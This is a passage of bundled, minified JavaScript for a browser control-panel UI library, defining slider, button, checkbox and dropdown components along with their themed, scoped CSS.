                        t.default = function e(t, i, n) {
                            if (!(this instanceof e))
                                throw new TypeError("Cannot call a class as a function");
                            this.opts = i,
                                this.container = r(2)(t, i.label, n),
                                (0,
                                    o.default)(this.container, {});
                            t = this.container.appendChild(document.createElement("div")),
                                (0,
                                    o.default)(t, {
                                        "box-sizing": "border-box",
                                        width: "100%",
                                        display: "inline-block",
                                        height: n.sizing.componentHeight,
                                        verticalAlign: "top"
                                    }),
                                t = t.appendChild(document.createElement("div"));
                            t.innerHTML = "&#9632; " + i.label + " &#9632;",
                                (0,
                                    o.default)(t, {
                                        display: "inline-block",
                                        verticalAlign: "sub",
                                        height: n.sizing.componentHeight,
                                        "line-height": n.sizing.componentHeight,
                                        "padding-left": "5px",
                                        "padding-right": "5px",
                                        "background-color": n.colors.textPrimary,
                                        color: n.colors.panelBackground
                                    })
                        }
                            ,
                            e.exports = t.default
                    }
                    , function (e, t, a) {
                        "use strict";
                        function i(e) {
                            return e && e.__esModule ? e : {
                                default: e
                            }
                        }
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var n = function (e, t, i) {
                            return t && o(e.prototype, t),
                                i && o(e, i),
                                e
                        }
                            , r = i(a(4))
                            , s = i(a(0))
                            , _ = i(a(10))
                            , E = a(30)
                            , r = function (e) {
                                function o(e, t, i, n) {
                                    if (!(this instanceof o))
                                        throw new TypeError("Cannot call a class as a function");
                                    var r = function (e, t) {
                                        if (e)
                                            return !t || "object" != typeof t && "function" != typeof t ? e : t;
                                        throw new ReferenceError("this hasn't been initialised - super() hasn't been called")
                                    }(this, (o.__proto__ || Object.getPrototypeOf(o)).call(this));
                                    if (r.opts = t,
                                        r.container = a(2)(e, t.label, i),
                                        a(5)(r.container, t.label, i),
                                        t.step && t.steps)
                                        throw new Error("Cannot specify both step and steps. Got step = " + t.step + ", steps = ", t.steps);
                                    if (r.input = r.container.appendChild(document.createElement("input")),
                                        r.input.type = "range",
                                        r.input.className = E["yusukefy-range"],
                                        t.label && r.input.setAttribute("aria-label", t.label + " input"),
                                        "log" === t.scale) {
                                        if (t.max = (0,
                                            _.default)(t.max) ? t.max : 100,
                                            t.min = (0,
                                                _.default)(t.min) ? t.min : .1,
                                            t.min * t.max <= 0)
                                            throw new Error("Log range min/max must have the same sign and not equal zero. Got min = " + t.min + ", max = " + t.max);
                                        if (r.logmin = t.min,
                                            r.logmax = t.max,
                                            r.logsign = 0 < t.min ? 1 : -1,
                                            r.logmin = Math.abs(r.logmin),
                                            r.logmax = Math.abs(r.logmax),
                                            t.min = 0,
                                            t.max = 100,
                                            (0,
                                                _.default)(t.step))
                                            throw new Error("Log may only use steps (integer number of steps), not a step value. Got step =" + t.step);
                                        if (t.step = 1,
                                            t.initial = r.InverseScaleValue((0,
                                                _.default)(t.initial) ? t.initial : scaleValue(.5 * (t.min + t.max))),
                                            t.initial * r.InverseScaleValue(t.max) <= 0)
                                            throw new Error("Log range initial value must have the same sign as min/max and must not equal zero. Got initial value = " + t.initial)
                                    } else
                                        t.max = (0,
                                            _.default)(t.max) ? t.max : 100,
                                            t.min = (0,
                                                _.default)(t.min) ? t.min : 0,
                                            t.step = (0,
                                                _.default)(t.step) ? t.step : .01,
                                            t.initial = (0,
                                                _.default)(t.initial) ? t.initial : .5 * (t.min + t.max);
                                    (0,
                                        _.default)(t.steps) && (t.step = (0,
                                            _.default)(t.steps) ? (t.max - t.min) / t.steps : t.step);
                                    e = Math.round((t.initial - t.min) / t.step);
                                    return t.initial = t.min + t.step * e,
                                        r.input.min = t.min,
                                        r.input.max = t.max,
                                        r.input.step = t.step,
                                        r.input.value = t.initial,
                                        (0,
                                            s.default)(r.input, {
                                                width: "calc(100% - " + i.sizing.labelWidth + " - 16% - 0.5em)"
                                            }),
                                        r.valueComponent = a(6)(r.container, r.ScaleValue(t.initial), i, "16%"),
                                        t.label && r.valueComponent.setAttribute("aria-label", t.label + " value"),
                                        setTimeout(function () {
                                            r.emit("initialized", parseFloat(r.input.value))
                                        }),
                                        r.userIsModifying = !1,
                                        r.input.addEventListener("focus", function () {
                                            r.focused = !0
                                        }),
                                        r.input.addEventListener("blur", function () {
                                            r.focused = !1
                                        }),
                                        r.input.addEventListener("mouseup", function () {
                                            r.input.blur()
                                        }),
                                        r.input.oninput = function (e) {
                                            e = r.ScaleValue(parseFloat(e.target.value));
                                            r.valueComponent.value = r.FormatNumber(e),
                                                r.lastValue = e,
                                                r.emit("input", e)
                                        }
                                        ,
                                        r.valueComponent.onchange = function () {
                                            var e = r.valueComponent.value;
                                            Number(parseFloat(e)) == e ? (e = parseFloat(e),
                                                e = Math.min(Math.max(e, t.min), t.max),
                                                e = Math.ceil((e - t.min) / t.step) * t.step + t.min,
                                                r.valueComponent.value = e,
                                                r.emit("input", e)) : r.valueComponent.value = r.lastValue
                                        }
                                        ,
                                        r
                                }
                                var t = o;
                                if ("function" != typeof e && null !== e)
                                    throw new TypeError("Super expression must either be null or a function, not " + typeof e);
                                return t.prototype = Object.create(e && e.prototype, {
                                    constructor: {
                                        value: t,
                                        enumerable: !1,
                                        writable: !0,
                                        configurable: !0
                                    }
                                }),
                                    e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e),
                                    n(o, [{
                                        key: "ScaleValue",
                                        value: function (e) {
                                            return "log" === this.opts.scale ? this.logsign * Math.exp(Math.log(this.logmin) + (Math.log(this.logmax) - Math.log(this.logmin)) * e / 100) : e
                                        }
                                    }, {
                                        key: "InverseScaleValue",
                                        value: function (e) {
                                            return "log" === this.opts.scale ? 100 * (Math.log(e * this.logsign) - Math.log(this.logmin)) / (Math.log(this.logmax) - Math.log(this.logmin)) : e
                                        }
                                    }, {
                                        key: "SetValue",
                                        value: function (e) {
                                            !0 !== this.focused && (this.valueComponent.value = this.FormatNumber(e),
                                                this.input.value = this.InverseScaleValue(e),
                                                this.lastValue = this.input.value)
                                        }
                                    }, {
                                        key: "GetValue",
                                        value: function () {
                                            return this.input.value
                                        }
                                    }, {
                                        key: "FormatNumber",
                                        value: function (e) {
                                            return e.toFixed(3).replace(/\.?0*$/, "")
                                        }
                                    }]),
                                    o
                            }(r.default);
                        function o(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        t.default = r,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = Object.freeze(Object.defineProperties(["\n\ninput[type=range].yusukefy-range {\n    -webkit-appearance: none;\n    width: 100%;\n    height: ", ";\n    margin: 0px 0;\n    padding: 0;\n    display: inline-block;\n}\n\n/* Remove outlines since we'll be adding our own */\ninput[type=range].yusukefy-range:focus {\n    outline: none;\n}\ninput[type=range].yusukefy-range::-moz-focus-outer {\n    border: 0;\n}\n\n/* Webkit */\ninput[type=range].yusukefy-range::-webkit-slider-runnable-track {\n    width: 100%;\n    height: ", ";\n    cursor: ew-resize;\n    background: ", ";\n}\ninput[type=range].yusukefy-range::-webkit-slider-thumb {\n    height: ", ";\n    width: 10px;\n    background: ", ";\n    cursor: ew-resize;\n    -webkit-appearance: none;\n    margin-top: 0px;\n}\ninput[type=range].yusukefy-range:focus::-webkit-slider-runnable-track {\n    background: ", ";\n    outline: none;\n}\n\n/* Gecko */\ninput[type=range].yusukefy-range::-moz-range-track {\n    width: 100%;\n    height: ", ";\n    cursor: ew-resize;\n    background: ", ";\n}\ninput[type=range].yusukefy-range:focus::-moz-range-track {\n    background: ", ";\n}\ninput[type=range].yusukefy-range::-moz-range-thumb {\n    height: ", ";\n    width: 10px;\n    background: ", ";\n    cursor: ew-resize;\n    border: none;\n    border-radius: 0;\n}\n\n/* IE */\ninput[type=range].yusukefy-range::-ms-track {\n    width: 100%;\n    height: ", ";\n    cursor: ew-resize;\n    background: transparent;\n    border-color: transparent;\n    color: transparent;\n}\ninput[type=range].yusukefy-range::-ms-fill-lower {\n    background: ", ";\n}\ninput[type=range].yusukefy-range::-ms-fill-upper {\n    background: ", ";\n}\ninput[type=range].yusukefy-range:focus::-ms-fill-lower {\n    background: ", ";\n}\ninput[type=range].yusukefy-range:focus::-ms-fill-upper {\n    background: ", ";\n}\ninput[type=range].yusukefy-range::-ms-thumb {\n    width: 10px;\n    border-radius: 0px;\n    background: ", ";\n    cursor: ew-resize;\n    height: ", ";\n}\ninput[type=range].yusukefy-range:focus::-ms-fill-lower {\n    background: ", ";\n    outline: none;\n}\ninput[type=range].yusukefy-range:focus::-ms-fill-upper {\n    background: ", ";\n    outline: none;\n}\n\n"], {
                            raw: {
                                value: Object.freeze(["\n\ninput[type=range].yusukefy-range {\n    -webkit-appearance: none;\n    width: 100%;\n    height: ", ";\n    margin: 0px 0;\n    padding: 0;\n    display: inline-block;\n}\n\n/* Remove outlines since we'll be adding our own */\ninput[type=range].yusukefy-range:focus {\n    outline: none;\n}\ninput[type=range].yusukefy-range::-moz-focus-outer {\n    border: 0;\n}\n\n/* Webkit */\ninput[type=range].yusukefy-range::-webkit-slider-runnable-track {\n    width: 100%;\n    height: ", ";\n    cursor: ew-resize;\n    background: ", ";\n}\ninput[type=range].yusukefy-range::-webkit-slider-thumb {\n    height: ", ";\n    width: 10px;\n    background: ", ";\n    cursor: ew-resize;\n    -webkit-appearance: none;\n    margin-top: 0px;\n}\ninput[type=range].yusukefy-range:focus::-webkit-slider-runnable-track {\n    background: ", ";\n    outline: none;\n}\n\n/* Gecko */\ninput[type=range].yusukefy-range::-moz-range-track {\n    width: 100%;\n    height: ", ";\n    cursor: ew-resize;\n    background: ", ";\n}\ninput[type=range].yusukefy-range:focus::-moz-range-track {\n    background: ", ";\n}\ninput[type=range].yusukefy-range::-moz-range-thumb {\n    height: ", ";\n    width: 10px;\n    background: ", ";\n    cursor: ew-resize;\n    border: none;\n    border-radius: 0;\n}\n\n/* IE */\ninput[type=range].yusukefy-range::-ms-track {\n    width: 100%;\n    height: ", ";\n    cursor: ew-resize;\n    background: transparent;\n    border-color: transparent;\n    color: transparent;\n}\ninput[type=range].yusukefy-range::-ms-fill-lower {\n    background: ", ";\n}\ninput[type=range].yusukefy-range::-ms-fill-upper {\n    background: ", ";\n}\ninput[type=range].yusukefy-range:focus::-ms-fill-lower {\n    background: ", ";\n}\ninput[type=range].yusukefy-range:focus::-ms-fill-upper {\n    background: ", ";\n}\ninput[type=range].yusukefy-range::-ms-thumb {\n    width: 10px;\n    border-radius: 0px;\n    background: ", ";\n    cursor: ew-resize;\n    height: ", ";\n}\ninput[type=range].yusukefy-range:focus::-ms-fill-lower {\n    background: ", ";\n    outline: none;\n}\ninput[type=range].yusukefy-range:focus::-ms-fill-upper {\n    background: ", ";\n    outline: none;\n}\n\n"])
                            }
                        }))
                            , r = i(1)
                            , i = i(3)
                            , o = r.theme.colors.componentBackground
                            , a = r.theme.colors.componentForeground
                            , s = r.theme.colors.componentActive;
                        e.exports = i(n, r.theme.sizing.componentHeight, r.theme.sizing.componentHeight, o, r.theme.sizing.componentHeight, a, s, r.theme.sizing.componentHeight, o, s, r.theme.sizing.componentHeight, a, r.theme.sizing.componentHeight, o, o, s, s, a, r.theme.sizing.componentHeight, s, s)
                    }
                    , function (e, t, r) {
                        "use strict";
                        !function (t) {
                            var i = r(33)
                                , n = r(13);
                            e.exports = function () {
                                var e = Array.prototype.slice.call(arguments)
                                    , e = i.apply(null, e);
                                return t.document && n(i.getCss(e)),
                                    e
                            }
                        }
                            .call(t, r(32))
                    }
                    , function (e, t) {
                        var i = function () {
                            return this
                        }();
                        try {
                            i = i || Function("return this")() || (0,
                                eval)("this")
                        } catch (e) {
                            "object" == typeof window && (i = window)
                        }
                        e.exports = i
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = i(34);
                        e.exports = n(),
                            e.exports.csjs = n,
                            e.exports.noScope = n({
                                noscope: !0
                            }),
                            e.exports.getCss = i(12)
                    }
                    , function (e, t, i) {
                        "use strict";
                        e.exports = i(35)
                    }
                    , function (e, t, i) {
                        "use strict";
                        function _(e) {
                            return r(e) ? e.selector : e
                        }
                        function E(i, n) {
                            return Object.keys(i).reduce(function (e, t) {
                                return n[t] || (e[t] = i[t]),
                                    e
                            }, {})
                        }
                        var u = i(36)
                            , n = i(7)
                            , r = n.isComposition
                            , d = n.ignoreComposition
                            , T = i(37)
                            , A = i(38)
                            , h = i(11)
                            , l = i(43);
                        e.exports = function (e) {
                            var s = void 0 !== (e = void 0 === e ? {} : e).noscope && e.noscope;
                            return function (e, t) {
                                for (var t = Array(arguments.length - 1), i = 1; i < arguments.length; i++)
                                    t[i - 1] = arguments[i];
                                e = e,
                                    n = t.map(_);
                                var n, e = e.map(function (e, t) {
                                    return t !== n.length ? e + n[t] : e
                                }).join(""), r = d(t), e = s ? l(e) : A(e, r), o = u(e.css), a = E(e.classes, r), e = E(e.keyframes, r), r = o.compositions, a = T(a, e, r);
                                return Object.defineProperty(a, h, {
                                    enumerable: !1,
                                    configurable: !1,
                                    writeable: !1,
                                    value: o.css
                                })
                            }
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        function o(e) {
                            e = e.trim();
                            return "." === e[0] ? e.substr(1) : e
                        }
                        i(7).makeComposition;
                        var n = /\.([^\s]+)(\s+)(extends\s+)(\.[^{]+)/g;
                        e.exports = function (e) {
                            for (var t, i = []; t = n.exec(e);)
                                i.unshift(t);
                            return i.reduce(function (t, e) {
                                var i = o(e[1])
                                    , n = e[3]
                                    , r = e[4]
                                    , e = e.index + e[1].length + e[2].length
                                    , n = n.length + r.length;
                                return t.css = t.css.slice(0, e) + " " + t.css.slice(e + n + 1),
                                    r.split(",").map(o).forEach(function (e) {
                                        t.compositions[i] || (t.compositions[i] = {}),
                                            t.compositions[e] || (t.compositions[e] = {}),
                                            t.compositions[i][e] = t.compositions[e]
                                    }),
                                    t
                            }, {
                                css: e,
                                compositions: {}
                            })
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        function a(e) {
                            var n = {}
                                , r = [];
                            return function t(i) {
                                Object.keys(i).forEach(function (e) {
                                    n[e] || (n[e] = !0,
                                        r.push(e),
                                        t(i[e]))
                                })
                            }(e),
                                r
                        }
                        var s = i(7).makeComposition;
                        e.exports = function (r, n, o) {
                            var e = Object.keys(n).reduce(function (e, t) {
                                var i = n[t];
                                return e[i] = s([t], [i], !0),
                                    e
                            }, {});
                            return Object.keys(r).reduce(function (e, t) {
                                var i = r[t]
                                    , n = o[t]
                                    , n = n ? a(n) : []
                                    , t = [t].concat(n)
                                    , n = t.map(function (e) {
                                        return r[e] || e
                                    });
                                return e[i] = s(t, n),
                                    e
                            }, e)
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = i(39)
                            , r = i(42)
                            , i = i(8)
                            , o = i.classRegex
                            , _ = i.keyframesRegex;
                        e.exports = function (e, a) {
                            var s = n(e)
                                , t = {
                                    classes: o,
                                    keyframes: _
                                }
                                , e = Object.keys(t).reduce(function (r, o) {
                                    return {
                                        css: r.css.replace(t[o], function (e, t, i) {
                                            var n = a[i] ? i : s(i);
                                            return r[o][n] = i,
                                                t + n
                                        }),
                                        keyframes: r.keyframes,
                                        classes: r.classes
                                    }
                                }, {
                                    css: e,
                                    keyframes: {},
                                    classes: {}
                                });
                            return r(e)
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = i(40)
                            , r = i(41);
                        e.exports = function (e) {
                            var t = n(r(e));
                            return function (e) {
                                return e + "_" + t
                            }
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        e.exports = function (e) {
                            if (0 === e)
                                return "0";
                            for (var t = ""; 0 < e;)
                                t = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"[e % 62] + t,
                                    e = Math.floor(e / 62);
                            return t
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        e.exports = function (e) {
                            for (var t = 5381, i = e.length; i;)
                                t = 33 * t ^ e.charCodeAt(--i);
                            return t >>> 0
                        }
                    }
                    , function (e, t, i) {
                        var n = i(8).ignoreComments;
                        e.exports = function (i) {
                            var r = Object.keys(i.keyframes).reduce(function (e, t) {
                                return e[i.keyframes[t]] = t,
                                    e
                            }, {})
                                , e = Object.keys(r);
                            return e.length ? (e = "((?:animation|animation-name)\\s*:[^};]*)(" + e.join("|") + ")([;\\s])" + n,
                                e = new RegExp(e, "g"),
                            {
                                css: i.css.replace(e, function (e, t, i, n) {
                                    return t + r[i] + n
                                }),
                                keyframes: i.keyframes,
                                classes: i.classes
                            }) : i
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        function n(e, t) {
                            for (var i = {}; null !== (n = t.exec(e));) {
                                var n = n[2];
                                i[n] = n
                            }
                            return i
                        }
                        var i = i(8)
                            , r = i.classRegex
                            , o = i.keyframesRegex;
                        e.exports = function (e) {
                            return {
                                css: e,
                                keyframes: n(e, o),
                                classes: n(e, r)
                            }
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = i(11);
                        e.exports = function (e) {
                            return e[n]
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        e.exports = i(12)
                    }
                    , function (e, t, s) {
                        "use strict";
                        function i(e) {
                            return e && e.__esModule ? e : {
                                default: e
                            }
                        }
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var n = i(s(4))
                            , _ = (i(s(0)),
                                s(47))
                            , n = function (e) {
                                function a(e, t, i, n) {
                                    var r, o;
                                    if (this instanceof a)
                                        return (r = function (e, t) {
                                            if (e)
                                                return !t || "object" != typeof t && "function" != typeof t ? e : t;
                                            throw new ReferenceError("this hasn't been initialised - super() hasn't been called")
                                        }(this, (a.__proto__ || Object.getPrototypeOf(a)).call(this))).opts = t,
                                            r.container = s(2)(e, t.label, i),
                                            s(5)(r.container, "", i),
                                            (o = r.container.appendChild(document.createElement("button"))).className = _["yusukefy-button"],
                                            o.textContent = t.label,
                                            o.addEventListener("click", t.action),
                                            o.addEventListener("mouseup", function () {
                                                o.blur()
                                            }),
                                            r;
                                    throw new TypeError("Cannot call a class as a function")
                                }
                                var t = a;
                                if ("function" != typeof e && null !== e)
                                    throw new TypeError("Super expression must either be null or a function, not " + typeof e);
                                return t.prototype = Object.create(e && e.prototype, {
                                    constructor: {
                                        value: t,
                                        enumerable: !1,
                                        writable: !0,
                                        configurable: !0
                                    }
                                }),
                                    e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e),
                                    a
                            }(n.default);
                        t.default = n,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = Object.freeze(Object.defineProperties(["\n\n.yusukefy-button {\n    box-sizing: border-box !important;\n    color: ", ";\n    background-color: ", ";\n\n    position: absolute;\n    text-align: center;\n    height: ", ";\n    line-height: ", ";\n    padding-top: 0px;\n    padding-bottom: 0px;\n    width: calc(100% - ", ");\n    border: none;\n    cursor: pointer;\n    right: 0;\n    font-family: inherit;\n}\n\n\n.yusukefy-button:focus {\n    outline:none;\n}\n.yusukefy-button::-moz-focus-inner {\n    border:0;\n}\n\n.yusukefy-button:hover,\n.yusukefy-button:focus {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-button:active {\n    color: ", " !important;\n    background-color: ", " !important;\n}\n\n"], {
                            raw: {
                                value: Object.freeze(["\n\n.yusukefy-button {\n    box-sizing: border-box !important;\n    color: ", ";\n    background-color: ", ";\n\n    position: absolute;\n    text-align: center;\n    height: ", ";\n    line-height: ", ";\n    padding-top: 0px;\n    padding-bottom: 0px;\n    width: calc(100% - ", ");\n    border: none;\n    cursor: pointer;\n    right: 0;\n    font-family: inherit;\n}\n\n\n.yusukefy-button:focus {\n    outline:none;\n}\n.yusukefy-button::-moz-focus-inner {\n    border:0;\n}\n\n.yusukefy-button:hover,\n.yusukefy-button:focus {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-button:active {\n    color: ", " !important;\n    background-color: ", " !important;\n}\n\n"])
                            }
                        }))
                            , r = i(1)
                            , i = i(3);
                        e.exports = i(n, r.theme.colors.textSecondary, r.theme.colors.componentBackground, r.theme.sizing.componentHeight, r.theme.sizing.componentHeight, r.theme.sizing.labelWidth, r.theme.colors.textHover, r.theme.colors.componentForeground, r.theme.colors.textActive, r.theme.colors.componentActive)
                    }
                    , function (e, t, a) {
                        "use strict";
                        function i(e) {
                            return e && e.__esModule ? e : {
                                default: e
                            }
                        }
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var n = function (e, t, i) {
                            return t && o(e.prototype, t),
                                i && o(e, i),
                                e
                        }
                            , r = i(a(4))
                            , s = (i(a(0)),
                                a(49))
                            , r = function (e) {
                                function o(e, t, i, n) {
                                    var r;
                                    if (this instanceof o)
                                        return (r = function (e, t) {
                                            if (e)
                                                return !t || "object" != typeof t && "function" != typeof t ? e : t;
                                            throw new ReferenceError("this hasn't been initialised - super() hasn't been called")
                                        }(this, (o.__proto__ || Object.getPrototypeOf(o)).call(this))).opts = t,
                                            r.container = a(2)(e, t.label, i),
                                            a(5)(r.container, t.label, i),
                                            r.input = r.container.appendChild(document.createElement("input")),
                                            r.input.id = "checkbox-" + t.label + n,
                                            r.input.type = "checkbox",
                                            r.input.checked = t.initial,
                                            r.input.className = s["yusukefy-checkbox"],
                                            t.label && r.input.setAttribute("aria-label", t.label),
                                            r.container.appendChild(document.createElement("label")).htmlFor = r.input.id,
                                            setTimeout(function () {
                                                r.emit("initialized", r.input.checked)
                                            }),
                                            r.input.onchange = function (e) {
                                                r.emit("input", e.target.checked)
                                            }
                                            ,
                                            r;
                                    throw new TypeError("Cannot call a class as a function")
                                }
                                var t = o;
                                if ("function" != typeof e && null !== e)
                                    throw new TypeError("Super expression must either be null or a function, not " + typeof e);
                                return t.prototype = Object.create(e && e.prototype, {
                                    constructor: {
                                        value: t,
                                        enumerable: !1,
                                        writable: !0,
                                        configurable: !0
                                    }
                                }),
                                    e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e),
                                    n(o, [{
                                        key: "SetValue",
                                        value: function (e) {
                                            this.input.checked = e
                                        }
                                    }, {
                                        key: "GetValue",
                                        value: function () {
                                            return this.input.checked
                                        }
                                    }]),
                                    o
                            }(r.default);
                        function o(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        t.default = r,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = Object.freeze(Object.defineProperties(['\n\ninput[type=checkbox].yusukefy-checkbox {\n    opacity: 0;\n    appearance: none;\n    -moz-appearance: none;\n    -webkit-appearance: none;\n    margin: 0;\n    border-radius: 0;\n    cursor: pointer;\n}\n\ninput[type=checkbox].yusukefy-checkbox + label {\n    margin: 0;\n}\n\ninput[type=checkbox].yusukefy-checkbox + label:before {\n    content: "";\n    display: inline-block;\n    width: ', ";\n    height: ", ";\n    padding: 0;\n    margin: 0;\n    vertical-align: middle;\n    background-color: ", ";\n    border-radius: 0px;\n    cursor: pointer;\n    box-sizing: content-box;\n    -moz-box-sizing: content-box;\n    -webkit-box-sizing: content-box;\n\n}\n\n/* Hover style */\ninput[type=checkbox].yusukefy-checkbox:hover + label:before {\n    width: calc(", " - (", " * 2));\n    height: calc(", " - (", " * 2));\n    background-color: ", ";\n    border: solid 4px ", ";\n}\n\n/* Checked style */\ninput[type=checkbox]:checked.yusukefy-checkbox + label:before {\n    width: calc(", " - (", " * 2));\n    height: calc(", " - (", " * 2));\n    background-color: ", ";\n    border: solid ", " ", ";\n}\n\n/* Focused and checked */\ninput[type=checkbox]:checked.yusukefy-checkbox:focus + label:before {\n    width: calc(", " - (", " * 2));\n    height: calc(", " - (", " * 2));\n    background-color: ", ";\n    border: solid ", " ", ";\n}\n\n/* Focus and unchecked */\ninput[type=checkbox].yusukefy-checkbox:focus + label:before {\n    background-color: ", ";\n}\n\n"], {
                            raw: {
                                value: Object.freeze(['\n\ninput[type=checkbox].yusukefy-checkbox {\n    opacity: 0;\n    appearance: none;\n    -moz-appearance: none;\n    -webkit-appearance: none;\n    margin: 0;\n    border-radius: 0;\n    cursor: pointer;\n}\n\ninput[type=checkbox].yusukefy-checkbox + label {\n    margin: 0;\n}\n\ninput[type=checkbox].yusukefy-checkbox + label:before {\n    content: "";\n    display: inline-block;\n    width: ', ";\n    height: ", ";\n    padding: 0;\n    margin: 0;\n    vertical-align: middle;\n    background-color: ", ";\n    border-radius: 0px;\n    cursor: pointer;\n    box-sizing: content-box;\n    -moz-box-sizing: content-box;\n    -webkit-box-sizing: content-box;\n\n}\n\n/* Hover style */\ninput[type=checkbox].yusukefy-checkbox:hover + label:before {\n    width: calc(", " - (", " * 2));\n    height: calc(", " - (", " * 2));\n    background-color: ", ";\n    border: solid 4px ", ";\n}\n\n/* Checked style */\ninput[type=checkbox]:checked.yusukefy-checkbox + label:before {\n    width: calc(", " - (", " * 2));\n    height: calc(", " - (", " * 2));\n    background-color: ", ";\n    border: solid ", " ", ";\n}\n\n/* Focused and checked */\ninput[type=checkbox]:checked.yusukefy-checkbox:focus + label:before {\n    width: calc(", " - (", " * 2));\n    height: calc(", " - (", " * 2));\n    background-color: ", ";\n    border: solid ", " ", ";\n}\n\n/* Focus and unchecked */\ninput[type=checkbox].yusukefy-checkbox:focus + label:before {\n    background-color: ", ";\n}\n\n"])
                            }
                        }))
                            , r = i(1)
                            , i = i(3);
                        e.exports = i(n, r.theme.sizing.componentHeight, r.theme.sizing.componentHeight, r.theme.colors.componentBackground, r.theme.sizing.componentHeight, "4px", r.theme.sizing.componentHeight, "4px", r.theme.colors.componentBackgroundHover, r.theme.colors.componentBackground, r.theme.sizing.componentHeight, "4px", r.theme.sizing.componentHeight, "4px", r.theme.colors.componentForeground, "4px", r.theme.colors.componentBackground, r.theme.sizing.componentHeight, "4px", r.theme.sizing.componentHeight, "4px", r.theme.colors.componentForeground, "4px", r.theme.colors.componentBackgroundHover, r.theme.colors.componentBackgroundHover)
                    }
                    , function (e, t, I) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var i = function (e, t, i) {
                            return t && r(e.prototype, t),
                                i && r(e, i),
                                e
                        }
                            , n = I(4)
                            , n = n && n.__esModule ? n : {
                                default: n
                            }
                            , c = I(51)
                            , n = function (e) {
                                function l(e, t, i, n) {
                                    if (!(this instanceof l))
                                        throw new TypeError("Cannot call a class as a function");
                                    var r, o, a, s, _, E, u, d = function (e, t) {
                                        if (e)
                                            return !t || "object" != typeof t && "function" != typeof t ? e : t;
                                        throw new ReferenceError("this hasn't been initialised - super() hasn't been called")
                                    }(this, (l.__proto__ || Object.getPrototypeOf(l)).call(this));
                                    if (d.opts = t,
                                        d.container = I(2)(e, t.label, i),
                                        I(5)(d.container, t.label, i),
                                        d.input = document.createElement("select"),
                                        d.input.className = c["yusukefy-select-dropdown"],
                                        t.label && d.input.setAttribute("aria-label", t.label),
                                        (o = document.createElement("span")).classList.add(c["yusukefy-select-triangle"], c["yusukefy-select-triangle--down"]),
                                        (a = document.createElement("span")).classList.add(c["yusukefy-select-triangle"], c["yusukefy-select-triangle--up"]),
                                        d.container.appendChild(o),
                                        d.container.appendChild(a),
                                        Array.isArray(t.options))
                                        for (r = 0; r < t.options.length; r++)
                                            _ = t.options[r],
                                                (E = document.createElement("option")).value = E.textContent = _,
                                                t.initial === _ && (E.selected = "selected"),
                                                d.input.appendChild(E);
                                    else
                                        for (u = Object.keys(t.options),
                                            r = 0; r < u.length; r++)
                                            s = u[r],
                                                (E = document.createElement("option")).value = s,
                                                t.initial === s && (E.selected = "selected"),
                                                E.textContent = t.options[s],
                                                d.input.appendChild(E);
                                    d.container.appendChild(d.input),
                                        d.input.onchange = function (e) {
                                            d.emit("input", e.target.value)
                                        }
                                        ;
                                    function T() {
                                        o.classList.add(c["yusukefy-select-triangle--down-highlight"]),
                                            a.classList.add(c["yusukefy-select-triangle--up-highlight"])
                                    }
                                    function A() {
                                        o.classList.remove(c["yusukefy-select-triangle--down-highlight"]),
                                            a.classList.remove(c["yusukefy-select-triangle--up-highlight"])
                                    }
                                    var h = !1;
                                    return d.input.addEventListener("mouseover", T),
                                        d.input.addEventListener("focus", function () {
                                            h = !0,
                                                T()
                                        }),
                                        d.input.addEventListener("blur", function () {
                                            h = !1,
                                                A()
                                        }),
                                        d.input.addEventListener("mouseleave", function () {
                                            h || A()
                                        }),
                                        d
                                }
                                var t = l;
                                if ("function" != typeof e && null !== e)
                                    throw new TypeError("Super expression must either be null or a function, not " + typeof e);
                                return t.prototype = Object.create(e && e.prototype, {
                                    constructor: {
                                        value: t,
                                        enumerable: !1,
                                        writable: !0,
                                        configurable: !0
                                    }
                                }),
                                    e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e),
                                    i(l, [{
                                        key: "SetValue",
                                        value: function (e) {
                                            this.input.value = e
                                        }
                                    }, {
                                        key: "GetValue",
                                        value: function () {
                                            return this.input.value
                                        }
                                    }]),
                                    l
                            }(n.default);
                        function r(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        t.default = n,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
